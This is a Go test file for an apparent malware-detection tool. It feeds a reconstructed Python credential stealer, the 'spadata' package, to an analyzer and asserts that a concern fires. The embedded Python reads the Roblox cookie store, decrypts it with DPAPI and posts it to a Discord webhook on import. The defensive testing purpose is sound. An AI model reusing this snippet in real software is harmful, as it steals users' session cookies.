package source_test

import (
	"iter"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/sarahmaeve/signatory/internal/signal/source"
	"github.com/sarahmaeve/signatory/internal/signal/source/astfeature"
	"github.com/sarahmaeve/signatory/internal/signal/source/python"
)

// oneFile yields a single SourceFile through the analyzer's stream API.
func oneFile(path, content string) iter.Seq2[astfeature.SourceFile, error] {
	return func(yield func(astfeature.SourceFile, error) bool) {
		yield(astfeature.SourceFile{Path: path, Content: []byte(content)}, nil)
	}
}

// TestSpadata_ConcernFiresEndToEnd is the P0+P1 capstone: a spadata-
// faithful __init__.py — reconstructed from the atomdrift writeup's
// IOCs (read robloxcookies.dat → DPAPI CryptUnprotectData → base64 →
// Discord webhook exfil) — run through the REAL Python analyzer must
// produce a Counts whose in-situ concern fires on its single published
// version, naming both new rare-on-benign features.
//
// This is the whole point of P0+P1. Before them, spadata's only
// observable AST features were import_time_call_sites, network_call_sites
// and base64_decode_calls — exactly the three EXCLUDED from the concern
// subset — so it passed the source gate clean. P1 adds the
// credential-store read (sensitive_path_reads) and P0 the DPAPI decrypt
// (credential_decrypt_calls): two rare-on-benign features → the
// MinConcernFeatures=2 threshold is met on the single version.
//
// Faithfulness note: the cookie path is built inline in the open()
// call. The analyzer has no data-flow, so the `p = <path>; open(p)`
// indirection is a conservative miss (the pre-existing "unresolved
// name" gap, not introduced by P0/P1).
func TestSpadata_ConcernFiresEndToEnd(t *testing.T) {
	t.Parallel()

	src := "" +
		"import os, base64, requests\n" +
		"from win32crypt import CryptUnprotectData\n" +
		"\n" +
		"def _grab():\n" +
		"    blob = open(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Roblox', 'LocalStorage', 'robloxcookies.dat'), 'rb').read()\n" +
		"    cookie = CryptUnprotectData(base64.b64decode(blob))[1]\n" +
		"    requests.post('https://discord.com/api/webhooks/123/abc', json={'c': cookie})\n" +
		"\n" +
		"_grab()\n"

	counts, err := python.NewAnalyzer().Analyze(t.Context(),
		oneFile("spadata/__init__.py", src))
	require.NoError(t, err)

	// The two rare-on-benign features P0+P1 add.
	assert.GreaterOrEqual(t, counts.SensitivePathReads, 1,
		"P1: reads the Roblox cookie store robloxcookies.dat")
	assert.GreaterOrEqual(t, counts.CredentialDecryptCalls, 1,
		"P0: DPAPI CryptUnprotectData")

	got := source.DetectConcern([]source.MatrixRow{
		{Version: "0.1.1", AST: &counts},
	})
	assert.True(t, got.ConcernPresent,
		"spadata's single weaponized version must now fire source_evolution_concern")
	assert.Equal(t, "0.1.1", got.FirstConcernVersion)
	assert.Contains(t, got.ConcerningFeatures, "sensitive_path_reads")
	assert.Contains(t, got.ConcerningFeatures, "credential_decrypt_calls")
}
